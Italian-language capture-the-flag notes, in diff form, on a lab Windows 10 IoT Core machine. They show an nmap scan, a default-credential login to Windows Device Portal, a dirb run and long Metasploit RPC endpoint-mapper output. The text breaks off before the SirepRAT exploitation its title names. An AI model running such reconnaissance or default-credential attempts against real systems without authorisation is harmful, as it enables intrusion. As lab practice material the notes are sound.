@@ -1,0 +1,547 @@
+Note Generali: Windows Device Portal -> Windows 10 IoT Core -> Vulnerability on Sirep/WPCon -> SirepRAT
+---------------------------------------------------------------------------------------------------------------
+nmap -Pn -n -vvv 10.10.10.204
+
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-24 16:11 EST
+	Initiating Connect Scan at 16:11
+	Scanning 10.10.10.204 [1000 ports]
+	Discovered open port 135/tcp on 10.10.10.204
+	Discovered open port 8080/tcp on 10.10.10.204
+	Completed Connect Scan at 16:12, 18.56s elapsed (1000 total ports)
+	Nmap scan report for 10.10.10.204
+	Host is up, received user-set (0.12s latency).
+	Scanned at 2020-11-24 16:11:55 EST for 18s
+	Not shown: 998 filtered ports
+	Reason: 998 no-responses
+	PORT     STATE SERVICE    REASON
+	135/tcp  open  msrpc      syn-ack
+	8080/tcp open  http-proxy syn-ack
+---------------------------------------------------------------------------------------------------------------
+Facciamo una capatina su 10.10.10.204:8080
+Chiede delle credenziali, la pagina dice "Windows device portal"
+Cerco su internet le credenziali di default Administrator:p@ssw0rd, si apre una nuova pagina: http://10.10.10.204:8080/authorizationrequired.htm
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+10.10.10.204	omni.htb
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.10.204 -w /usr/share/wordlists/dirb/common.txt
+
+Niente di interessante
+---------------------------------------------------------------------------------------------------------------
+Facciamo un po' di recognizione con msfconsole
+search rpc
+
+use scanner/dcerpc/endpoint_mapper -> shop options -> set rhost 10.10.10.204 -> run
+	[*] 10.10.10.204:135      - Connecting to the endpoint mapper service...
+	[*] 10.10.10.204:135      - d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 TCP (49664) 10.10.10.204 
+	[*] 10.10.10.204:135      - e3dc38e9-b3af-4ed1-9cc8-938de5f16e14 v1.0 LRPC (LRPC-c289cef5c0b3aeddc7) 
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 PIPE (\pipe\lsass) \\omni [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (audit) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (securityevent) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (LSARPC_ENDPOINT) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsacap) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (LSA_IDPEXT_ENDPOINT) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (LSA_EAS_ENDPOINT) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsapolicylookup) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (lsasspirpc) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (protected_storage) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (SidKey Local End Point) [KeyIso]
+	[*] 10.10.10.204:135      - b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86 v2.0 LRPC (samss lpc) [KeyIso]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 PIPE (\pipe\lsass) \\omni [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (audit) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (securityevent) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (LSARPC_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsacap) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (LSA_IDPEXT_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (LSA_EAS_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsapolicylookup) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (lsasspirpc) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (protected_storage) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (SidKey Local End Point) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8fb74744-b2ff-4c00-be0d-9ef9a191fe1b v1.0 LRPC (samss lpc) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 PIPE (\pipe\lsass) \\omni [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (audit) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (securityevent) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (LSARPC_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsacap) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (LSA_IDPEXT_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (LSA_EAS_ENDPOINT) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsapolicylookup) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (lsasspirpc) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (protected_storage) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (SidKey Local End Point) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 LRPC (samss lpc) [Ngc Pop Key Service]
+	[*] 10.10.10.204:135      - 8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 LRPC (OLE7A59BA7C78FA0B97BBFF574F9B28) 
+	[*] 10.10.10.204:135      - 8ec21e98-b5ce-4916-a3d6-449fa428a007 v0.0 LRPC (LRPC-474a1cfe9f1201152b) 
+	[*] 10.10.10.204:135      - 0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 LRPC (OLE7A59BA7C78FA0B97BBFF574F9B28) 
+	[*] 10.10.10.204:135      - 0fc77b1a-95d8-4a2e-a0c0-cff54237462b v0.0 LRPC (LRPC-474a1cfe9f1201152b) 
+	[*] 10.10.10.204:135      - b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 LRPC (OLE7A59BA7C78FA0B97BBFF574F9B28) 
+	[*] 10.10.10.204:135      - b1ef227e-dfa5-421e-82bb-67a6a129c496 v0.0 LRPC (LRPC-474a1cfe9f1201152b) 
+	[*] 10.10.10.204:135      - c27f3c08-92ba-478c-b446-b419c4cef0e2 v1.0 LRPC (LRPC-f93ab3eac1f774232f) 
+	[*] 10.10.10.204:135      - 4c9dbf19-d39e-4bb9-90ee-8f7179b20283 v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - fd8be72b-a9cd-4b2c-a9ca-4ded242fbe4d v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - 95095ec8-32ea-4eb0-a3e2-041f97b36168 v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - e38f5360-8572-473e-b696-1b46873beeab v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - d22895ef-aff4-42c5-a5b2-b14466d34ab4 v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - 98cd761e-e77d-41c8-a3c0-0fb756d90ec2 v1.0 LRPC (LRPC-caaa884847dcd1405f) 
+	[*] 10.10.10.204:135      - 367abb81-9844-35f1-ad32-98f038001003 v2.0 TCP (49666) 10.10.10.204 
+	[*] 10.10.10.204:135      - abfb6ca3-0c5e-4734-9285-0aee72fe8d1c v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - b37f900a-eae4-4304-a2ab-12bb668c0188 v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - e7f76134-9ef5-4949-a2d6-3368cc0988f3 v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - 7aeb6705-3ae6-471a-882d-f39c109edc12 v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - f44e62af-dab1-44c2-8013-049a9de417d6 v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - c2d1b5dd-fa81-4460-9dd6-e7658b85454b v1.0 LRPC (LRPC-1dddc8c5d82bf8924b) 
+	[*] 10.10.10.204:135      - dd490425-5325-4565-b774-7e27d6c09c24 v1.0 LRPC (LRPC-3270c41e06af13daae) [Base Firewall Engine API]
+	[*] 10.10.10.204:135      - 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 LRPC (LRPC-3270c41e06af13daae) [Fw APIs]
+	[*] 10.10.10.204:135      - 7f9d11bf-7fb9-436b-a812-b2d50c5d4c03 v1.0 LRPC (LRPC-03dfedb488a83a5269) [Fw APIs]
+	[*] 10.10.10.204:135      - f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 LRPC (LRPC-3270c41e06af13daae) [Fw APIs]
+	[*] 10.10.10.204:135      - f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 LRPC (LRPC-03dfedb488a83a5269) [Fw APIs]
+	[*] 10.10.10.204:135      - f47433c3-3e9d-4157-aad4-83aa1f5c2d4c v1.0 LRPC (LRPC-46628b7b33c3d5c33c) [Fw APIs]
+	[*] 10.10.10.204:135      - 2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 LRPC (LRPC-3270c41e06af13daae) [Fw APIs]
+	[*] 10.10.10.204:135      - 2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 LRPC (LRPC-03dfedb488a83a5269) [Fw APIs]
+	[*] 10.10.10.204:135      - 2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 LRPC (LRPC-46628b7b33c3d5c33c) [Fw APIs]
+	[*] 10.10.10.204:135      - 2fb92682-6599-42dc-ae13-bd2ca89bd11c v1.0 LRPC (LRPC-ea4ad98330b2c3f3ad) [Fw APIs]
+	[*] 10.10.10.204:135      - f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 LRPC (nlaplg) [Witness Client Upcall Server]
+	[*] 10.10.10.204:135      - f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 LRPC (nlaapi) [Witness Client Upcall Server]
+	[*] 10.10.10.204:135      - f2c9b409-c1c9-4100-8639-d8ab1486694a v1.0 LRPC (DNSResolver) [Witness Client Upcall Server]
+	[*] 10.10.10.204:135      - eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 LRPC (nlaplg) [Witness Client Test Interface]
+	[*] 10.10.10.204:135      - eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 LRPC (nlaapi) [Witness Client Test Interface]
+	[*] 10.10.10.204:135      - eb081a0d-10ee-478a-a1dd-50995283e7a8 v3.0 LRPC (DNSResolver) [Witness Client Test Interface]
+	[*] 10.10.10.204:135      - 7f1343fe-50a9-4927-a778-0c5859517bac v1.0 LRPC (nlaplg) [DfsDs service]
+	[*] 10.10.10.204:135      - 7f1343fe-50a9-4927-a778-0c5859517bac v1.0 LRPC (nlaapi) [DfsDs service]
+	[*] 10.10.10.204:135      - 7f1343fe-50a9-4927-a778-0c5859517bac v1.0 LRPC (DNSResolver) [DfsDs service]
+	[*] 10.10.10.204:135      - 7f1343fe-50a9-4927-a778-0c5859517bac v1.0 PIPE (\PIPE\wkssvc) \\omni [DfsDs service]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [Impl friendly name]
+	[*] 10.10.10.204:135      - c9ac6db5-82b7-4e55-ae8a-e464ed7b4277 v1.0 LRPC (IUserProfile2) [Impl friendly name]
+	[*] 10.10.10.204:135      - 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) 
+	[*] 10.10.10.204:135      - 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 LRPC (IUserProfile2) 
+	[*] 10.10.10.204:135      - 0a74ef1c-41a4-4e06-83ae-dc74fb1cdd53 v1.0 LRPC (DeviceSetupManager) 
+	[*] 10.10.10.204:135      - 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) 
+	[*] 10.10.10.204:135      - 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 LRPC (IUserProfile2) 
+	[*] 10.10.10.204:135      - 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 LRPC (DeviceSetupManager) 
+	[*] 10.10.10.204:135      - 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 LRPC (ubpmtaskhostchannel) 
+	[*] 10.10.10.204:135      - 33d84484-3626-47ee-8c6f-e7e98b113be1 v2.0 LRPC (LRPC-3fa9d524e6cdc2f67e) 
+	[*] 10.10.10.204:135      - 86d35949-83c9-4044-b424-db363231fd0c v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) 
+	[*] 10.10.10.204:135      - 86d35949-83c9-4044-b424-db363231fd0c v1.0 LRPC (IUserProfile2) 
+	[*] 10.10.10.204:135      - 86d35949-83c9-4044-b424-db363231fd0c v1.0 LRPC (DeviceSetupManager) 
+	[*] 10.10.10.204:135      - 86d35949-83c9-4044-b424-db363231fd0c v1.0 LRPC (ubpmtaskhostchannel) 
+	[*] 10.10.10.204:135      - 86d35949-83c9-4044-b424-db363231fd0c v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) 
+	[*] 10.10.10.204:135      - 3a9ef155-691d-4449-8d05-09ad57031823 v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) 
+	[*] 10.10.10.204:135      - 3a9ef155-691d-4449-8d05-09ad57031823 v1.0 LRPC (IUserProfile2) 
+	[*] 10.10.10.204:135      - 3a9ef155-691d-4449-8d05-09ad57031823 v1.0 LRPC (DeviceSetupManager) 
+	[*] 10.10.10.204:135      - 3a9ef155-691d-4449-8d05-09ad57031823 v1.0 LRPC (ubpmtaskhostchannel) 
+	[*] 10.10.10.204:135      - 3a9ef155-691d-4449-8d05-09ad57031823 v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) 
+	[*] 10.10.10.204:135      - 552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [IP Transition Configuration endpoint]
+	[*] 10.10.10.204:135      - 552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 LRPC (IUserProfile2) [IP Transition Configuration endpoint]
+	[*] 10.10.10.204:135      - 552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 LRPC (DeviceSetupManager) [IP Transition Configuration endpoint]
+	[*] 10.10.10.204:135      - 552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 LRPC (ubpmtaskhostchannel) [IP Transition Configuration endpoint]
+	[*] 10.10.10.204:135      - 552d076a-cb29-4e44-8b6a-d15e59e2c0af v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) [IP Transition Configuration endpoint]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (IUserProfile2) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (DeviceSetupManager) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (ubpmtaskhostchannel) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (TeredoDiagnostics) [XactSrv service]
+	[*] 10.10.10.204:135      - 98716d03-89ac-44c7-bb8c-285824e51c4a v1.0 LRPC (TeredoControl) [XactSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (IUserProfile2) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (DeviceSetupManager) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (ubpmtaskhostchannel) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (TeredoDiagnostics) [IdSegSrv service]
+	[*] 10.10.10.204:135      - 1a0d010f-1c33-432c-b0f5-8cf4e8053099 v1.0 LRPC (TeredoControl) [IdSegSrv service]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (IUserProfile2) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (DeviceSetupManager) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (ubpmtaskhostchannel) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (TeredoDiagnostics) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (TeredoControl) [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 PIPE (\PIPE\srvsvc) \\omni [UserMgrCli]
+	[*] 10.10.10.204:135      - b18fbab6-56f8-4702-84e0-41053293a869 v1.0 LRPC (LRPC-0dab4a0c3a404c9627) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (OLE295D9891FEDC1FA3DF954FC715C6) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (IUserProfile2) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (DeviceSetupManager) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (ubpmtaskhostchannel) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (LRPC-3fa9d524e6cdc2f67e) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (TeredoDiagnostics) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (TeredoControl) [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 PIPE (\PIPE\srvsvc) \\omni [UserMgrCli]
+	[*] 10.10.10.204:135      - 0d3c7f20-1c8d-4654-a1b3-51563b298bda v1.0 LRPC (LRPC-0dab4a0c3a404c9627) [UserMgrCli]
+	[*] 10.10.10.204:135      - 7ea70bcf-48af-4f6a-8968-6a440754d5fa v1.0 LRPC (LRPC-a111de3cebed612a2d) [NSI server endpoint]
+	[*] 10.10.10.204:135      - 0a533b58-0ed9-4085-b6e8-95795e147972 v1.0 LRPC (LRPC-a111de3cebed612a2d) 
+	[*] 10.10.10.204:135      - 0a533b58-0ed9-4085-b6e8-95795e147972 v1.0 LRPC (OLE442FD38B6748C1362F8ECD77D100) 
+	[*] 10.10.10.204:135      - 0a533b58-0ed9-4085-b6e8-95795e147972 v1.0 LRPC (LRPC-466511a2182c9df1ec) 
+	[*] 10.10.10.204:135      - 5dea026d-f999-40b1-a234-2164fd086783 v1.0 LRPC (LRPC-a111de3cebed612a2d) 
+	[*] 10.10.10.204:135      - 5dea026d-f999-40b1-a234-2164fd086783 v1.0 LRPC (OLE442FD38B6748C1362F8ECD77D100) 
+	[*] 10.10.10.204:135      - 5dea026d-f999-40b1-a234-2164fd086783 v1.0 LRPC (LRPC-466511a2182c9df1ec) 
+	[*] 10.10.10.204:135      - 5dea026d-f999-40b1-a234-2164fd086783 v1.0 LRPC (LRPC-815509a4950f8d8e2a) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-a111de3cebed612a2d) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (OLE442FD38B6748C1362F8ECD77D100) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-466511a2182c9df1ec) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-815509a4950f8d8e2a) 
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-1b5baa3903472227c9) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (LRPC-a111de3cebed612a2d) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (OLE442FD38B6748C1362F8ECD77D100) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (LRPC-466511a2182c9df1ec) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (LRPC-815509a4950f8d8e2a) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (LRPC-1b5baa3903472227c9) 
+	[*] 10.10.10.204:135      - 2acb9d68-b434-4b3e-b966-e06b4b3a84cb v1.0 LRPC (LRPC-b868e599fc5a8c282b) 
+	[*] 10.10.10.204:135      - a4b8d482-80ce-40d6-934d-b22a01a44fe7 v1.0 LRPC (LicenseServiceEndpoint) [LicenseManager]
+	[*] 10.10.10.204:135      - d09bdeb5-6171-4a34-bfe2-06fa82652568 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) 
+	[*] 10.10.10.204:135      - 5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Network Connection Broker server endpoint for NCB Reset module]
+	[*] 10.10.10.204:135      - 5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Network Connection Broker server endpoint for NCB Reset module]
+	[*] 10.10.10.204:135      - 5222821f-d5e2-4885-84f1-5f6185a0ec41 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Network Connection Broker server endpoint for NCB Reset module]
+	[*] 10.10.10.204:135      - db2ce634-191d-42af-a28c-16be97924ca7 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) 
+	[*] 10.10.10.204:135      - db2ce634-191d-42af-a28c-16be97924ca7 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) 
+	[*] 10.10.10.204:135      - db2ce634-191d-42af-a28c-16be97924ca7 v1.0 LRPC (LRPC-43e3b04593e1a37036) 
+	[*] 10.10.10.204:135      - 97be9507-17da-4999-87d7-66c0b2d83cc7 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) 
+	[*] 10.10.10.204:135      - 97be9507-17da-4999-87d7-66c0b2d83cc7 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) 
+	[*] 10.10.10.204:135      - 97be9507-17da-4999-87d7-66c0b2d83cc7 v1.0 LRPC (LRPC-43e3b04593e1a37036) 
+	[*] 10.10.10.204:135      - 880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [KAPI Service endpoint]
+	[*] 10.10.10.204:135      - 880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [KAPI Service endpoint]
+	[*] 10.10.10.204:135      - 880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 LRPC (LRPC-43e3b04593e1a37036) [KAPI Service endpoint]
+	[*] 10.10.10.204:135      - 880fd55e-43b9-11e0-b1a8-cf4edfd72085 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [KAPI Service endpoint]
+	[*] 10.10.10.204:135      - e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Network Connection Broker server endpoint]
+	[*] 10.10.10.204:135      - e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Network Connection Broker server endpoint]
+	[*] 10.10.10.204:135      - e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 LRPC (LRPC-43e3b04593e1a37036) [Network Connection Broker server endpoint]
+	[*] 10.10.10.204:135      - e40f7b57-7a25-4cd3-a135-7f7d3df9d16b v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Network Connection Broker server endpoint]
+	[*] 10.10.10.204:135      - b4cb7611-ad0b-4c2d-b35f-ffe45785c709 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Wwan Service]
+	[*] 10.10.10.204:135      - b4cb7611-ad0b-4c2d-b35f-ffe45785c709 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Wwan Service]
+	[*] 10.10.10.204:135      - b4cb7611-ad0b-4c2d-b35f-ffe45785c709 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Wwan Service]
+	[*] 10.10.10.204:135      - b4cb7611-ad0b-4c2d-b35f-ffe45785c709 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Wwan Service]
+	[*] 10.10.10.204:135      - 9c56d792-0591-4431-8d1f-681bfd80e4c0 v1.0 LRPC (LRPC-fa28f9d6f96d61c5bf) [Wwan Service Second]
+	[*] 10.10.10.204:135      - 9c56d792-0591-4431-8d1f-681bfd80e4c0 v1.0 LRPC (OLE6984AC1E46A42A13D5285A2A51C9) [Wwan Service Second]
+	[*] 10.10.10.204:135      - 9c56d792-0591-4431-8d1f-681bfd80e4c0 v1.0 LRPC (LRPC-43e3b04593e1a37036) [Wwan Service Second]
+	[*] 10.10.10.204:135      - 9c56d792-0591-4431-8d1f-681bfd80e4c0 v1.0 LRPC (LRPC-9ceba29bbd9ce95c3a) [Wwan Service Second]
